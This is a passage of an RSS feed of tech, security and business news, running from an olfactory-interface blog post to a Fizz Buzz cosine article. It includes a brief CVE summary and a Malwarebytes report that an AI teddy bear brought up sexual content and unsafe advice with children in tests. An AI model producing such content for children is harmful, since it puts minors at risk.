speculative.One could try to make a similar argument for the eyes: take 400 cones on the retina, hijack them, and you've got yourself a 400-dimensional channel. But we think the nose is better. The olfactory system is  simpler and more directly interfaces with core brain regions, like the hippocampus. The signal through the olfactory system is simply less filtered and processed. If you tried to write arbitrary light intensities into a patch of cones, the next step of the processing would be a convolutional neural network-like structure in the visual cortex, and the signal would get averaged out. The embeddings you'd write would never make it into the higher levels of processing in the brain. You can try to encode the information in a more easily perceptible way, such as Chernoff faces, but it would reduce the bandwidth, and learning the remapping would still be very difficult.In contrast, only a few synapses separate the olfactory receptors from the hippocampus, which is responsible for memory, as well as from the amygdala, which does emotional regulation.Finally, personally speaking, the authors use their eyes and ears more than their noses during office work. The nose is an underutilized channel that imposes fewer bad priors (spatial/tonal maps) than the visual, auditory, and somatosensory.We found four scents in a couple of days. With a little more engineering, it should be possible to increase the bit rate of olfactory stimulation by .If we gain control of all 400 basis vectors, we might be able to .And we’ve already covered the first one percent.We thank Raffi Hotter, Aidan Smith, and especially Mason Wang for thoughtful feedback on this blogpost.]]></content:encoded></item><item><title>Nvidia confirms October Windows updates cause gaming issues</title><link>https://www.bleepingcomputer.com/news/technology/nvidia-fixes-gaming-issues-caused-by-october-windows-update/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Fri, 21 Nov 2025 19:57:48 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Nvidia has confirmed that last month's security updates are causing gaming performance issues on Windows 11 24H2 and Windows 11 25H2 systems. [...]]]></content:encoded></item><item><title>Discontinuation of ARM Notebook with Snapdragon X Elite SoC</title><link>https://www.tuxedocomputers.com/en/Discontinuation-of-ARM-notebooks-with-Snapdragon-X-Elite-SoC.tuxedo</link><author>Venn1</author><category>dev</category><pubDate>Fri, 21 Nov 2025 19:46:34 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[In the past 18 months, we have been working on an ARM notebook based on Qualcomm’s Snapdragon X1 Elite SoC (X1E). At this point, we are putting the project on hold. There are several reasons for this.Less suitable than expectedDevelopment turned out to be challenging due to the different architecture, and in the end, the first-generation X1E proved to be less suitable for Linux than expected. In particular, the long battery runtimes—usually one of the strong arguments for ARM devices—were not achieved under Linux. A viable approach for BIOS updates under Linux is also missing at this stage, as is fan control. Virtualization with KVM is not foreseeable on our model, nor are the high USB4 transfer rates. Video hardware decoding is technically possible, but most applications lack the necessary support.Given these conditions, investing several more months of development time does not seem sensible, as it is not foreseeable that all the features you can rightfully expect would be available in the end. In addition, we would be offering you a device with what would then be a more than two-year-old Snapdragon X Elite (X1E), whose successor, the Snapdragon X2 Elite (X2E), was officially introduced in September 2025 and is expected to become available in the first half of 2026.We will continue to monitor developments and evaluate the X2E at the appropriate time for its Linux suitability. If it meets expectations and we can reuse a significant portion of our work on the X1E, we may resume development. How much of our groundwork can be transferred to the X2E can only be assessed after a detailed evaluation of the chip.We would like to explicitly thank the ARM specialists at Linaro for the excellent collaboration. We will contribute the  we developed, along with further work, to the mainline kernel and thereby help improve Linux support for compatible devices, e.g. the Medion SUPRCHRGD, and thus make our work available to the community.]]></content:encoded></item><item><title>November 2025 Patch Tuesday: One Zero-Day and Five Critical Vulnerabilities Among 63 CVEs</title><link>https://www.crowdstrike.com/en-us/blog/patch-tuesday-analysis-november-2025/</link><author></author><category>security</category><pubDate>Fri, 21 Nov 2025 19:31:59 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[November 2025 Patch Tuesday: One Zero-Day and Five Critical Vulnerabilities Among 63 CVEs]]></content:encoded></item><item><title>CVE-2025-64767 - hpke-js reuses AEAD nonces</title><link>https://cvefeed.io/vuln/detail/CVE-2025-64767</link><author></author><category>vulns</category><pubDate>Fri, 21 Nov 2025 19:16:03 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-64767
 Nov. 21, 2025, 7:16 p.m. | 1 day, 22 hours ago
hpke-js is a Hybrid Public Key Encryption (HPKE) module built on top of Web Cryptography API. Prior to version 1.7.5, the public SenderContext Seal() API has a race condition which allows for the same AEAD nonce to be re-used for multiple Seal() calls. This can lead to complete loss of Confidentiality and Integrity of the produced messages. This issue has been patched in version 1.7.5.
 9.1 | CRITICAL

Visit the link for more details, such as CVSS details, affected products, timeline, and more...
]]></content:encoded></item><item><title>More on Rewiring Democracy</title><link>https://www.schneier.com/blog/archives/2025/11/71226.html</link><author>Bruce Schneier</author><category>security</category><pubDate>Fri, 21 Nov 2025 19:07:34 +0000</pubDate><source url="https://www.schneier.com/">Schneier on Security</source><content:encoded><![CDATA[Some of the book’s forty-three chapters are available online: chapters 2,  12, 28, 34, 38, and 41.We need more reviews—six on Amazon is not enough, and no one has yet posted a viral TikTok review. One review was published in  and another on the RSA Conference website, but more would be better. If you’ve read the book, please leave a review somewhere.My coauthor and I have been doing all sort of book events, both online and in person. This book event, with Danielle Allen at the Harvard Kennedy School Ash Center, is particularly good.  We also have been doing a ton of podcasts, both separately and together. They’re all on the book’s homepage.There are two live book events in December. If you’re in Boston, come see us at the MIT Museum on 12/1. If you’re in Toronto, you can see me at the Munk School at the University of Toronto on 12/2.I’m also doing a live AMA on the book on the RSA Conference website on 12/16. Register here.]]></content:encoded></item><item><title>&quot;Largest Data Leak in History&quot;</title><link>https://www.youtube.com/watch?v=ByfvX1z0u-I</link><author>Seytonic</author><category>security</category><enclosure url="https://www.youtube.com/v/ByfvX1z0u-I?version=3" length="" type=""/><pubDate>Fri, 21 Nov 2025 18:55:15 +0000</pubDate><source url="https://www.youtube.com/channel/UCW6xlqxSY3gGur4PkGPEUeA">Seytonic</source><content:encoded><![CDATA[Start learning cyber security with TryHackMe: https://tryhackme.com/Seytonic Use my code "SEYTONIC25" to get 25% off on annual subscription.


Forgot to mention the researchers behind the WhatsApp scraping were from the University of Vienna, their paper can be found here: https://github.com/sbaresearch/whatsapp-census/blob/main/Hey_there_You_are_using_WhatsApp.pdf

0:00 Intro
0:17 "The Largest Data Leak in History"
4:45 Massive SIM Farm Raided
6:59 North Koreans Discover AI Filters


Sources:
https://github.com/sbaresearch/whatsapp-census/blob/main/Hey_there_You_are_using_WhatsApp.pdf
https://www.univie.ac.at/en/news/detail/forscherinnen-entdecken-grosse-sicherheitsluecke-in-whatsapp

https://www.youtube.com/watch?v=Z-ImysXws-0
https://www.europol.europa.eu/media-press/newsroom/news/cybercrime-service-takedown-7-arrested

https://quetzal.bitso.com/p/interview-with-the-chollima
https://quetzal.bitso.com/p/interview-with-the-chollima-iii
https://quetzal.bitso.com/p/interview-with-the-chollima-v


===============================================
My Website: https://www.seytonic.com/
Follow me on TWTR: https://twitter.com/seytonic
Follow me on INSTA: https://www.instagram.com/jhonti/
===============================================]]></content:encoded></item><item><title>AI teddy bear for kids responds with sexual content and advice about weapons</title><link>https://www.malwarebytes.com/blog/news/2025/11/ai-teddy-bear-for-kids-responds-with-sexual-content-and-advice-about-weapons</link><author></author><category>threatintel</category><pubDate>Fri, 21 Nov 2025 18:45:32 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[In testing, FoloToy’s AI teddy bear jumped from friendly chat to sexual topics and unsafe household advice. It shows how easily artificial intelligence can cross serious boundaries. It’s a fair moment to ask whether AI-powered stuffed animals are appropriate for children.  It’s easy to get swept up in the excitement of artificial intelligence, especially when it’s packaged as a plush teddy bear promising “warmth, fun, and a little extra curiosity.” FoloToy, a Singapore-based toy company, marketed the $99 bear as the ultimate “friend for both kids and adults,” leveraging powerful conversational AI to deliver interactive stories and playful banter. The website described Kumma as intelligent and safe. Behind the scenes, the bear used OpenAI’s language model to generate its conversational responses. Unfortunately, reality didn’t match the sales pitch.According to a report from the US PIRG Education Fund, Kumma quickly veered into wildly inappropriate territory during researcher tests. Conversations escalated from innocent to sexual within minutes. The bear didn’t just respond to explicit prompts, which would have been more or less understandable. Researchers said it introduced graphic sexual concepts on its own, including BDSM-related topics, explained “knots for beginners,” and referenced roleplay scenarios involving children and adults.  In some conversations, Kumma also probed for personal details or offered advice involving dangerous objects in the home.It’s unclear whether the toy’s supposed safeguards against inappropriate content were missing or simply didn’t work. While children are unlikely to introduce BDSM as a topic to their teddy bear, the researchers warned just how low the bar was for Kumma to cross serious boundaries.The fallout was swift. FoloToy suspended sales of Kumma and other AI-enabled toys, while OpenAI revoked the developer’s access for policy violations. But as PIRG researchers note, that response was reactive. Plenty of AI toys remain unregulated, and the risks aren’t limited to one product.Which proves our point: AI does not automatically make something better. When companies rush out “smart” features without real safety checks, the risks fall on the people using them—especially children, who can’t recognize dangerous content when they see it.Tips for staying safe with AI toys and gadgetsYou’ll see “AI-powered” on almost everything right now, but there are ways to make safer choices. Check for third-party safety reviews before buying any AI-enabled product marketed for kids.Test first, supervise always: Interact with the device yourself before giving it to children. Monitor usage for odd or risky responses. If available, enable all content filters and privacy protections. If devices show inappropriate content, report to manufacturers and consumer protection groups. Find out what the device collects, who it shares data with, and what it uses the information for. But above all, remember that not all “smart” is safe. Sometimes, plush, simple, and old-fashioned really is better.AI may be everywhere, but designers and buyers alike need to put safety, privacy, and common sense ahead of the technological wow-factor.We don’t just report on data privacy—we help you remove your personal informationCybersecurity risks should never spread beyond a headline. With Malwarebytes Personal Data Remover, you can scan to find out which sites are exposing your personal information, and then delete that sensitive data from the internet.]]></content:encoded></item><item><title>North Korean Kimsuky and Lazarus Join Forces to Exploit Zero-Day Vulnerabilities Targeting Critical Sectors Worldwide</title><link>https://cybersecuritynews.com/north-korean-kimsuky-and-lazarus-join-forces/</link><author></author><category>security</category><pubDate>Fri, 21 Nov 2025 18:09:22 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[North Korean Kimsuky and Lazarus Join Forces to Exploit Zero-Day Vulnerabilities Targeting Critical Sectors Worldwide
            Two of North Korea’s most dangerous hacking groups have joined forces to launch a coordinated attack campaign that threatens organizations worldwide.
The Kimsuky and Lazarus groups are working togethe ... Vulnerabilities has been mentioned in this article.]]></content:encoded></item><item><title>Microsoft: Out-of-band update fixes Windows 11 hotpatch install loop</title><link>https://www.bleepingcomputer.com/news/microsoft/microsoft-out-of-band-update-fixes-windows-11-hotpatch-install-loop/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Fri, 21 Nov 2025 18:02:05 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Microsoft has released an out-of-band cumulative update to fix a known issue causing the November 2025 KB5068966 hotpatch update to reinstall on Windows 11 systems repeatedly. [...]]]></content:encoded></item><item><title>Grafana warns of max severity admin spoofing vulnerability</title><link>https://www.bleepingcomputer.com/news/security/grafana-warns-of-max-severity-admin-spoofing-vulnerability/</link><author>Bill Toulas</author><category>security</category><pubDate>Fri, 21 Nov 2025 17:58:32 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Grafana Labs is warning of a maximum severity vulnerability (CVE-2025-41115) in its Enterprise product that can be exploited to treat new users as administrators or for privilege escalation. [...]]]></content:encoded></item><item><title>McDonald&apos;s is losing its low-income customers</title><link>https://www.latimes.com/business/story/2025-11-16/mcdonalds-is-losing-its-low-income-customers</link><author>PaulHoule</author><category>dev</category><pubDate>Fri, 21 Nov 2025 17:52:37 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[In the early 2000s, after a severe slump, McDonald’s orchestrated a major turnaround, with the introduction of its Dollar Menu.The menu, whose items  all  cost $1, illustrated just how important it was to market to low-income consumers — who value getting the most bang for their buck. Coming at a time of flagging growth, tumbling stock and the company’s first report of a quarterly loss, the Dollar Menu reversed the fast-food giant’s bad fortune. It paved the way for three years of sales growth at stores open at least a year and ballooned revenue by 33%, news outlets reported at the time.Industry-wide, fast-food restaurants have seen traffic from one of its core customer bases, low-income households, drop by double digits, McDonald’s chief executive Christopher Kempczinski told investors last week. Meanwhile, traffic from higher earners increased by nearly as much, he said. The struggle of the Golden Arches in particular — long synonymous with cheap food for the masses — reflects a larger trend upending the consumer economy and makes “affordability” a hot policy topic, experts say.McDonald’s executives say the higher costs of restaurant essentials, such as beef and salaries, have pushed food prices up and driven away lower-income customers who already are being squeezed by the rising cost of groceries, clothes, rent and child care.With prices for everything rising, consumer companies concerned about the pressures on low-income Americans include food, automotive and airline businesses, among others, analyst Adam Josephson said. “The list goes on and on,” he said. “Happy Meals at McDonald’s are prohibitively expensive for some people, because there’s been so much inflation,” Josephson said.Josephson and other economists say the shrinking traffic of low-income consumers is emblematic of a larger trend of Americans diverging in their spending, with wealthier customers flexing their purchasing power and lower-income shoppers pulling back — what some call a “K-shaped economy.” At hotel chains, luxury brands are holding up better than low-budget options. Revenue at brands including Four Seasons, Ritz-Carlton and St. Regis is up 2.9%  this year, while economy hotels experienced  a 3.1% decline for the same period, according to industry tracker CoStar.“There are examples everywhere you look,” Josephson said.Consumer credit delinquency rates show just how much low-income households are hurting, with households that make less than $45,000 annually experiencing  “huge year-over-year increases,” even as delinquency rates for high- and middle-income households have flattened and stabilized, said Rikard Bandebo, chief strategy officer and chief economist at VantageScore.After COVID-19-related stimulus programs ended, these households were the first to experience  dramatically increased delinquency rates, and haven’t had  a dip in delinquencies since 2022, according to data from VantageScore on 60-day, past-due delinquencies from January 2020 to September 2025. And although inflation has come down from its peak in 2022, people still are struggling with relatively higher prices and  “astronomical” rent increases, Bandebo said.A report released this year by researchers with Joint Center for Housing Studies at Harvard University found that half of all renters, 22.6 million people, were cost-burdened in 2023, meaning they spent more than 30% of their income on housing and utilities, up 3.2 percentage points since 2019 and 9 percentage points since 2001. Twenty-seven percent  of renters are severely burdened, spending more than 50% of their income on housing. As rents have grown, the amount families have left  after paying for housing and utilities has fallen to record lows. In 2023, renters with annual household incomes under $30,000 had a median of just $250 per month in residual income to spend on other needs, an amount that’s fallen 55% since 2001, with the steepest declines since the pandemic, according to the Harvard study. “It’s getting tougher and tougher every month for low-income households to make ends meet,” Bandebo said.Mariam Gergis, a registered nurse at UCLA who also works a second job as a home caregiver, said she’s better off than many others, and still she struggles.“I can barely afford McDonald’s,” she said. “But it’s a cheaper option.”On Monday morning she sat in a booth at a McDonald’s  in MacArthur Park with two others. The three beverages they ordered, two coffees and a soda, amounted to nearly $20, Gergis said, pointing to the receipt.“I’d rather have healthier foods, but when you’re on a budget, it’s difficult,” she said. Her brother, who works as a cashier, can’t afford meals out at all, she said. The cost of his diabetes medication has increased greatly, to about $200 a month, which she helps him cover.“He would rather go hungry than eat outside,” Gergis said. The bank  closed his credit cards due to nonpayment, she said, and he may lose his housing soon.Prices at limited-service restaurants, which include fast-food restaurants, are up 3.2% year over year, at a rate higher than inflation “and that’s climbing,” said Marisa DiNatale, an economist at Moody’s Analytics.On top of that, price increases because of  tariffs disproportionately affect lower-income households, because they spend a greater portion of their income on goods rather than services, which are not directly impacted by tariffs. Wages  also are stagnating more for these households compared to higher- and middle-income households, DiNatale said. “It has always been the case that more well-off people have done better. But a lot of the economic and policy headwinds are disproportionately affecting lower-income households, and [McDonald’s losing low-income customers] is a reflection of that,” DiNatale said.It makes sense, then, that any price increases would hit these consumers hard.According to a corporate fact sheet, from 2019 to 2024, the average cost of a McDonald’s menu item rose 40%. The average price of a Big Mac in 2019, for example, was $4.39, rising in 2024 to $5.29, according to the company. A 10-piece McNuggets Meal rose from $7.19 to $9.19 in the same time period.The company says these increases are in line with the costs of running a restaurant — including soaring labor costs and high prices of beef and other goods.Beef prices have skyrocketed, with inventory of the U.S. cattle herd at the lowest in 75 years because of  the toll of drought and parasites. And exports of beef bound to the U.S. are down because of President Trump’s trade war and tariffs. As a result the prices of ground beef sold in supermarkets is up 13% in September, year-over-year.McDonald’s also has placed blame on the meat-packing industry, accusing it of maneuvering to artificially inflate prices in a lawsuit filed last year against the industry’s “Big Four” companies — Tyson, JBS, Cargill and the National Beef Packing Company. The companies  denied wrongdoing and paid tens of millions of dollars to settle  lawsuits alleging price-fixing.McDonald’s chief financial officer Ian Borden said on the recent earnings call that the company has managed to keep expenses from getting out of control.“The strength of our supply chain means our beef costs are, I think, certainly up less than most,” he said.McDonald’s did not disclose how the company gauges the income levels of  fast-food customers, but businesses often analyze the market by estimating the background of their customers based on where they are shopping and what they are buying.In California, the debate around fast-food prices has centered on labor costs, with legislation going into effect last year raising the minimum wage for fast-food workers at chains with more than 60 locations nationwide.But more than a year after fast-food wages were boosted, the impact still is being debated, with economists divided and the fast-food industry and unions sparring over its impact.Fast-food restaurant owners as well as trade associations like the International Franchise Assn., which spearheaded an effort to block the minimum wage boost, have said businesses have been forced to trim employee hours, institute hiring freezes or lay people off to offset the cost of higher wages.Meanwhile, an analysis by researchers at UC Berkeley’s Center on Wage and Employment Dynamics of some 2,000 restaurants found the $20 wage did not reduce fast-food employment and “led to minimal menu price increases” of “about 8 cents on a $4 burger.” McDonald’s said last year that spending by the company on restaurant worker salaries had grown around 40% since 2019, while costs for food, paper and other goods were up 35%.The success of its Dollar Menu in the early 2000s was remarkable because it came amid complaints of the chain’s highly processed, high-calorie and high-fat products, food safety concerns and worker exploitation.As the company marketed the Dollar Menu, which included the double cheeseburger, the McChicken sandwich, French fries, a hot fudge sundae and a 16-ounce soda, it also added healthier options to its regular menu, including salads and fruit. But the healthier menu items did not drive the turnaround. The $1 double cheeseburgers brought in far more revenue than salads or the chicken sandwiches, which were priced from  $3 to $4.50. “The Dollar Menu appeals to lower-income, ethnic consumers,”  Steve Levigne, vice president for United States business research at McDonald’s, told the New York Times in 2006. “It’s people who don’t always have $6 in their pocket.”The Dollar Menu eventually became unsustainable, however. With inflation driving up prices, McDonald’s stores, particularly franchisee locations, struggled to afford it, and by November 2013 rebranded it as the “Dollar Menu & More” with prices up to $5.Last year McDonald’s took a stab at appealing to cash-stretched customers with a $5 deal for a McDouble or McChicken sandwich, small fries, small soft drink and four-piece McNuggets. And in January it rolled out a deal offering a $1 menu item alongside an item bought for full price, with an ad starring John Cena, and launched Extra Value Meals in early September — offering combos costing 15% less than ordering each of the items separately.The marketing didn’t seem to immediately resonate with  customers, with McDonald’s in May reporting U.S. same-store sales in the recent quarter declined 3.6% from the year before. However, in its recent third-quarter earnings, the company reported a 2.4% lift in sales, even as its chief executive sounded the alarm about the increasingly two-tiered economy.The iconic brand still has staying power, even with prices creeping up, some customers said.“Everywhere prices are going up. This is the only place I do eat out, because it’s convenient,” said Ronald Mendez, 32, who said he lives about a block away from the McDonald’s in MacArthur Park.D.T. Turner, 18, munched on hash browns and pancakes, with several still-wrapped McMuffins and cheeseburgers sitting on the tray between him and his friend. In total, their haul cost about $45, he said. He eats at McDonald’s several times a week.“We grew up eating it,” Turner said.His friend chimed in: “The breakfast is great, and nuggets are cool.”That other businesses also are reviving deals is a sign of the times. San Francisco-based burger chain Super Duper promoted its “recession combo” on social media. For $10, customers get fries, a drink and a “recession burger” at one of the chain’s 19 California locations.What’s clear is companies are wary of passing along higher costs to customers, said DiNatale, of Moody’s Analytics.“A lot of businesses are saying, ‘We just don’t think consumers will stand for this,’” DiNatale said. Consumers “have been through years of higher prices, and there’s just very little tolerance for higher prices going forward.”]]></content:encoded></item><item><title>CrowdStrike catches insider feeding information to ScatteredLapsus$Hunters</title><link>https://databreaches.net/2025/11/21/crowdstrike-catches-insider-feeding-information-to-scatteredlapsushunters/?pk_campaign=feed&amp;pk_kwd=crowdstrike-catches-insider-feeding-information-to-scatteredlapsushunters</link><author>Dissent</author><category>databreach</category><pubDate>Fri, 21 Nov 2025 17:44:01 +0000</pubDate><source url="https://databreaches.net/">Recent Data breaches</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Helping Valve to power up Steam devices</title><link>https://www.igalia.com/2025/11/helpingvalve.html</link><author>TingPing</author><category>dev</category><pubDate>Fri, 21 Nov 2025 17:29:59 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Last week, Valve stunned the computer gaming world by unveiling three new gaming devices at once: the Steam Frame, a wireless VR headset; the Steam Machine, a gaming console in the vein of a PlayStation or Xbox; and the Steam Controller, a handheld game controller.  Successors to the highly successful Valve Index and Steam Deck, these devices are set to be released in the coming year.Igalia has long worked with Valve on SteamOS, which will power the Machine and Frame, and is excited to be contributing to these new devices, particularly the Frame.  The Frame, unlike the Machine or Deck which have x86 CPUs, runs on an ARM-based CPU.Under normal circumstances, this would mean that only games compiled to run on ARM chips could be played on the Frame.  In order to get around this barrier, a translation layer called FEX is used to run applications compiled for x86 chips (which are used in nearly all gaming PCs) on ARM chips by translating the x86 machine code into ARM64 machine code.“If you love video games, like I do, working on FEX with Valve is a dream come true,” said Paulo Matos, an engineer with Igalia’s Compilers Team.  Even so, the challenges can be daunting, because making sure the translation is working often requires manual QA rather than automated testing.  “You have to start a game, sometimes the error shows up in the colors or sound, or how the game behaves when you break down the door in the second level. Just debugging this can take a while,” said Matos.  “For optimization work I did early last year, I used a game called  to test it. I must have played the first 3 to 4 minutes of the game many, many times for debugging. Looking at my history, Steam tells me I played it for 29 hours, but it was always the first few minutes, nothing else.”Beyond the CPU, the Qualcomm Adreno 750 GPU used in the Steam Frame introduced its own set of challenges when it came to running desktop games, and other complex workloads, on these devices. Doing so requires a rock-solid Vulkan driver that can ensure correctness, eliminating major rendering bugs, while maintaining high performance.  This is a very difficult combination to achieve, and yet that’s exactly what we’ve done for Valve with Mesa3DTurnip, a FOSS Vulkan driver for Qualcomm Adreno GPUs.“We implemented many Vulkan extensions and reviewed numerous others,” said Danylo Piliaiev, an engineer on the Graphics Team. “Over the years, we ensured that D3D11, D3D12, and OpenGL games rendered correctly through DXVK, vkd3d-proton, and Zink, investigating many rendering issues along the way. We achieved higher correctness than the proprietary driver and, in many cases, Mesa3D Turnip is faster as well.”We’ve worked with many wonderful people from Valve, Google, and other companies to iterate on the Vulkan driver over the years in order to introduce new features, bug fixes, performance improvements, as well as debugging workflows. Some of those people decided to join Igalia later on, such as our colleague and Graphics Team developer Emma Anholt. “I’ve been working on Mesa for 22 years, and it’s great to have a home now where I can keep doing that work, across hardware projects, where the organization prioritizes the work experience of its developers and empowers them within the organization.”Valve’s support in all this cannot be understated, either.  Their choice to build their devices using open software like Mesa3D Turnip and FEX means they’re committed to working on and supporting improvements and optimizations that become available to anyone who uses the same open-source projects.“We’ve received a lot of positive feedback about significantly improved performance and fewer rendering glitches from hobbyists who use these projects to run PC games on Android phones as a result of our work,” said Dhruv Mark Collins, another Graphics Team engineer working on Turnip. “And it goes both ways! We’ve caught a couple of nasty bugs because of that widespread testing, which really emphasizes why the FOSS model is beneficial for everyone involved.”An interesting area of graphics driver development is all the compiler work that is involved. Vulkan drivers such as Mesa3D Turnip need to process shader programs sent by the application to the GPU, and these programs govern how pixels in our screens are shaded or colored with geometry, textures, and lights while playing games. Job Noorman, an engineer from our Compilers Team, made significant contributions to the compiler used by Mesa3D Turnip. He also contributed to the Mesa3D NIR shader compiler, a common part that all Mesa drivers use, including RADV (most popularly used on the Steam Deck) or V3DV (used on Raspberry Pi boards).As is normal for Igalia, while we focused on delivering results for our customer, we also made our work as widely useful as possible.  For example: “While our target throughout our work has been the Snapdragon 8 Gen 3 that’s in the Frame, much of our work extends back through years of Snapdragon hardware, and we regression test it to make sure it stays Vulkan conformant,” said Anholt.  This means that Igalia’s work for the Frame has consistently passed Vulkan’s Conformance Test Suite (CTS) of over 2.8 million tests, some of which Igalia is involved in creating.Igalia and other Valve contractors actively participate in several areas inside the Khronos Group, the organization maintaining and developing graphics API standards like Vulkan. We contribute specification fixes and feedback, and we are regularly involved in the development of many new Vulkan extensions. Some of these end up being critical for game developers, like mesh shading. Others ensure a smooth and efficient translation of other APIs like DirectX to Vulkan, or help take advantage of hardware features to ensure applications perform great across multiple platforms, both mobile like the Steam Frame or desktop like the Steam Machine. Having Vulkan CTS coverage for these new extensions is a critical step in the release process, helping make sure the specification is clear and drivers implement it correctly, and Igalia engineers have contributed millions of source code lines and tests since our collaboration with Valve started.A huge challenge we faced in moving forward with development is ensuring that we didn’t introduce regressions, small innocent-seeming changes can completely break rendering on games in a way that even CTS might not catch. What automated testing could be done was often quite constrained, but Igalians found ways to push through the barriers.  “I made a continuous integration test to automatically run single-frame captures of a wide range of games spanning D3D11, D3D9, D3D8, Vulkan, and OpenGL APIs,” said Piliaiev, about the development covered in his recent XDC 2025 talk, “ensuring that we don’t have rendering or performance regressions.”Looking ahead, Igalia’s work for Valve will continue to deliver benefits to the wider Linux Gaming ecosystem.  For example, the Steam Frame, as a battery-powered VR headset, needs to deliver high performance within a limited power budget.  A way to address this is to create a more efficient task scheduler, which is something Changwoo Min of Igalia’s Kernel Team has been working on.  As he says, “I have been developing a customized CPU scheduler for gaming, named LAVD: Latency-criticality Aware Virtual Deadline scheduler.”In general terms, a scheduler automatically identifies critical tasks and dynamically boosts their deadlines to improve responsiveness.  Most task schedulers don’t take energy consumption into account, but the Rust-based LAVD is different.  “LAVD makes scheduling decisions considering each chip’s performance versus energy trade-offs. It measures and predicts the required computing power on the fly, then selects the best set of CPUs to meet that demand with minimal energy consumption,” said Min.One of our other kernel engineers, Melissa Wen, has been working on AMD kernel display drivers to maintain good color management and HDR support for SteamOS across AMD hardware families, both for the Steam Deck and the Steam Machine. This is especially important with newer display hardware in the Steam Machine, which features some notable differences in color capabilities, aiming for more powerful and efficient color management which necessitated driver work.…and that’s a wrap! We will continue our efforts toward improving future versions of SteamOS, and with a partner as strongly supportive as Valve, we expect to do more work to make Linux gaming even better.  If any of that sounded interesting and you’d like to work with us to tackle tricky problems of your own, please get in touch!]]></content:encoded></item><item><title>Solving Fizz Buzz with Cosines</title><link>https://susam.net/fizz-buzz-with-cosines.html</link><author>hprotagonist</author><category>dev</category><pubDate>Fri, 21 Nov 2025 17:28:25 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[By  on 20 Nov 2025
  Fizz Buzz is a counting game that has become oddly popular in the
  world of computer programming as a simple test of basic programming
  skills.  The rules of the game are straightforward.  Players say the
  numbers aloud in order beginning with one.  Whenever a number is
  divisible by 3, they say 'Fizz' instead.  If it is divisible by 5,
  they say 'Buzz'.  If it is divisible by both 3 and 5, the player
  says both 'Fizz' and 'Buzz'.  Here is a typical Python program that
  prints this sequence:
for n in range(1, 101):
    if n % 15 == 0:
        print('FizzBuzz')
    elif n % 3 == 0:
        print('Fizz')
    elif n % 5 == 0:
        print('Buzz')
    else:
        print(n)
  Here is the output:
  fizz-buzz.txt.  Can we make
  the program more complicated?  The words 'Fizz', 'Buzz' and
  'FizzBuzz' repeat in a periodic manner throughout the sequence.
  What else is periodic?  Trigonometric functions!  Perhaps we can use
  trigonometric functions to encode all four rules of the sequence in
  a single closed-form expression.  That is what we are going to
  explore in this article.  By the end, we will obtain a discrete
  Fourier series that can take any integer \( n \) and select the
  corresponding text to be printed.

  Before going any further, we establish a precise mathematical
  definition for the Fizz Buzz sequence.  We begin by introducing a
  few functions that will help us define the Fizz Buzz sequence later.

  We define a set of four functions \( \{ s_0, s_1, s_2, s_3 \} \) for
  integers \( n \) by:

  \begin{align*}
    s_0(n) &= n, \\
    s_1(n) &= \mathtt{Fizz}, \\
    s_2(n) &= \mathtt{Buzz}, \\
    s_3(n) &= \mathtt{FizzBuzz}.
  \end{align*}

  We call these the symbol functions because they produce every term
  that appears in the Fizz Buzz sequence.  The symbol function \( s_0
  \) returns \( n \) itself.  The functions \( s_1, \) \( s_2 \) and
  \( s_3 \) are constant functions that always return the literal
  words \( \mathtt{Fizz}, \) \( \mathtt{Buzz} \) and \(
  \mathtt{FizzBuzz} \) respectively, no matter what the value of \( n
  \) is.

  Now we can define the Fizz Buzz sequence as the sequence

  \[
    (s_{f(n)}(n))_{n = 1}^{\infty}
  \]

  where

  \[
    f(n) = \begin{cases}
      1 & \text{if } 3 \mid n \text{ and } 5 \nmid n, \\
      2 & \text{if } 3 \nmid n \text{ and } 5 \mid n, \\
      3 & \text{if } 3 \mid n \text{ and } 5 \mid n, \\
      0 & \text{otherwise}.
    \end{cases}
  \]

  The notation \( m \mid n \) means that the integer \( m \) divides
  the integer \( n, \) i.e. \( n \) is a multiple of \( m.  \)
  Equivalently, there exists an integer \( c \) such that \( n = cm
 .  \)  Similarly, \( m \nmid n \) means that \( m \) does not divide
  \( n, \) i.e. \( n \) is not a multiple of \( m.  \)  With the above
  definitions in place, we can expand the first few terms of the
  sequence explicitly as follows:

  \begin{align*}
    (s_{f(n)}(n))_{n = 1}^{\infty}
    &= (s_{f(1)}(1), \; s_{f(2)}(2), \; s_{f(3)}(3), \; s_{f(4)}(4), \;
            s_{f(5)}(5), \; s_{f(6)}(6), \; s_{f(7)}(7), \; \dots) \\
    &= (s_0(1), \; s_0(2), \; s_1(3), \; s_0(4),
            s_2(5), \; s_1(6), \; s_0(7), \; \dots) \\
    &= (1, \; 2, \; \mathtt{Fizz}, \; 4, \;
            \mathtt{Buzz}, \; \mathtt{Fizz}, \; 7, \; \dots).
  \end{align*}

  Note how the function \( f(n) \) produces an index \( i \) which we
  then use to select the symbol function \( s_i(n) \) to produce the
  \( n \)th term of the sequence.  We therefore call \( f(n) \) the
  index function.

  Here is the index function \( f(n) \) from the previous section with
  its cases and conditions rearranged to make it easier to spot
  interesting patterns:

  \[
    f(n) = \begin{cases}
      0 & \text{if } 5 \nmid n \text{ and } 3 \nmid n, \\
      1 & \text{if } 5 \nmid n \text{ and } 3 \mid n, \\
      2 & \text{if } 5 \mid n \text{ and } 3 \nmid n, \\
      3 & \text{if } 5 \mid n \text{ and } 3 \mid n.
    \end{cases}
  \]

